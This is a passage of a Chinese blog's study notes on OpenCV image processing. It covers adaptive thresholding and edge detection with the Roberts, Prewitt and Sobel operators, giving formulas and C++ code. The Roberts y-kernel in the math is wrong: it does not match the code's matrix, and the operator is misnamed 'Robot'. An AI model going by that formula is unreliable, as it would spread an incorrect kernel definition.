mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord">0</span></span></span></span></p></li><li><p>阈值分割的好坏取决于模糊的窗口大小、常量C，</p></li></ul><h3 id="自适应均值模糊分割"><a class="markdownIt-Anchor" href="#自适应均值模糊分割"></a> 自适应均值模糊分割</h3><ul><li>代码实现</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//src,dst,max_value,方法,阈值模式,模糊窗口大小,常量C</span></span><br><span class="line">adaptiveThreshold(gray,binary,<span class="number">255</span>,ADAPTIVE_THRESH_MEAN_C,THRESH_BINARY,<span class="number">25</span>,<span class="number">10</span>);</span><br></pre></td></tr></table></figure><h3 id="自适应高斯模糊分割"><a class="markdownIt-Anchor" href="#自适应高斯模糊分割"></a> 自适应高斯模糊分割</h3><ul><li>代码实现</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">adaptiveThreshold(gray,binary,<span class="number">255</span>,ADAPTIVE_THRESH_GAUSSIAN_C,THRESH_BINARY,<span class="number">25</span>,<span class="number">10</span>);</span><br></pre></td></tr></table></figure><h3 id="阈值函数"><a class="markdownIt-Anchor" href="#阈值函数"></a> 阈值函数</h3><h3 id="局部阈值分割"><a class="markdownIt-Anchor" href="#局部阈值分割"></a> 局部阈值分割</h3><h2 id="直方图-2"><a class="markdownIt-Anchor" href="#直方图-2"></a> 直方图</h2><h2 id="熵算法"><a class="markdownIt-Anchor" href="#熵算法"></a> 熵算法</h2><h1 id="边缘检测"><a class="markdownIt-Anchor" href="#边缘检测"></a> 边缘检测</h1><ul><li>边缘法线：单位向量在该方向图像像素强度变化最大</li><li>边缘方向：与边缘法线垂直</li><li>边缘位置或中心：图像边缘所在位置</li><li>边缘强度：沿法线方向的图像局部对比越大，越是边缘</li><li>边缘的种类<ol><li>跃迁类型</li><li>屋脊类型</li></ol></li></ul><h2 id="梯度"><a class="markdownIt-Anchor" href="#梯度"></a> 梯度</h2><ul><li>提取方法<ol><li>高斯模糊</li><li>基于梯度：都是基于阈值</li></ol><ul><li>Robot算子</li><li>Sobel算子</li><li>Prewitt算子</li></ul><ol start="3"><li>Canny</li></ol></li></ul><h3 id="robot算子"><a class="markdownIt-Anchor" href="#robot算子"></a> Robot算子</h3><ul><li>数学描述</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>x</mi></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">G_x=\begin{bmatrix}1 &amp; 0 \\  0 &amp; -1\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>y</mi></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">G_y=\begin{bmatrix}0 &amp; 1\\0 &amp; 1\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span></span></p><ul><li>L1梯度</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi>G</mi><mi mathvariant="normal">∣</mi><mo>=</mo><mi mathvariant="normal">∣</mi><msub><mi>G</mi><mi>x</mi></msub><mi mathvariant="normal">∣</mi><mo>+</mo><mi mathvariant="normal">∣</mi><msub><mi>G</mi><mi>y</mi></msub><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|G|=|G_x|+|G_y|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault">G</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord">∣</span></span></span></span></span></p><ul><li>L2梯度</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi>G</mi><mi mathvariant="normal">∣</mi><mo>=</mo><msqrt><mrow><msubsup><mi>G</mi><mi>x</mi><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>G</mi><mi>y</mi><mn>2</mn></msubsup></mrow></msqrt></mrow><annotation encoding="application/x-tex">|G|=\sqrt{G_x^2+G_y^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault">G</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.6276249999999999em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2123750000000002em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7401079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.1723749999999997em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M1001,80H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5c4,-6.7,10,-10,18,-10zM1001 80H400000v40H1013z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6276249999999999em;"><span></span></span></span></span></span></span></span></span></span></p><ul><li>robot算子可以检测出比较明显的边缘，如果过图像的边缘清晰，可以使用robot算子。</li></ul><h3 id="代码实现-7"><a class="markdownIt-Anchor" href="#代码实现-7"></a> 代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat robot_x = (Mat_&lt;<span class="keyword">int</span>&gt;(<span class="number">2</span>,<span class="number">2</span>)&lt;&lt;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>);</span><br><span class="line">Mat robot_y = (Mat_&lt;<span class="keyword">int</span>&gt;(<span class="number">2</span>,<span class="number">2</span>)&lt;&lt;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">Mat grad_x,grad_y;</span><br><span class="line">filter2D(src,grad_x,CV_32F,robot_x,Point(<span class="number">-1</span>,<span class="number">-1</span>),<span class="number">0</span>,BORDER_DEFAULT);</span><br><span class="line">filter2D(src,grad_y,CV_32F,robot_y,Point(<span class="number">-1</span>,<span class="number">-1</span>),<span class="number">0</span>,BORDER_DEFAULT);</span><br><span class="line">convertScaleAbs(grad_x,grad_x);</span><br><span class="line">convertScaleAbs(grad_y,grad_y);</span><br><span class="line">Mat dst;</span><br><span class="line">add(grad_x,grad_y,dst);</span><br></pre></td></tr></table></figure><h2 id="roberts算子"><a class="markdownIt-Anchor" href="#roberts算子"></a> Roberts算子</h2><h2 id="prewitt边缘检测"><a class="markdownIt-Anchor" href="#prewitt边缘检测"></a> Prewitt边缘检测</h2><ul><li>数学描述</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>x</mi></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">G_x=\begin{bmatrix}-1 &amp; 0 &amp; 1\\-1 &amp; 0 &amp; 1\\-1 &amp; 0 &amp; 1\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>y</mi></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">G_y=\begin{bmatrix}1 &amp; 1 &amp; 1\\0 &amp; 0 &amp; 0\\-1 &amp; -1 &amp; -1\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h2 id="sobel边缘检测"><a class="markdownIt-Anchor" href="#sobel边缘检测"></a> Sobel边缘检测</h2><h3 id="sobel算子"><a class="markdownIt-Anchor" href="#sobel算子"></a> Sobel算子</h3><ul><li>数学描述</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>x</mi></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>2</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">G_x=\begin{bmatrix}-1 &amp; 0 &amp; 1\\-2 &amp; 0 &amp; 2\\-1 &amp; 0 &amp; 1\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">2</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span 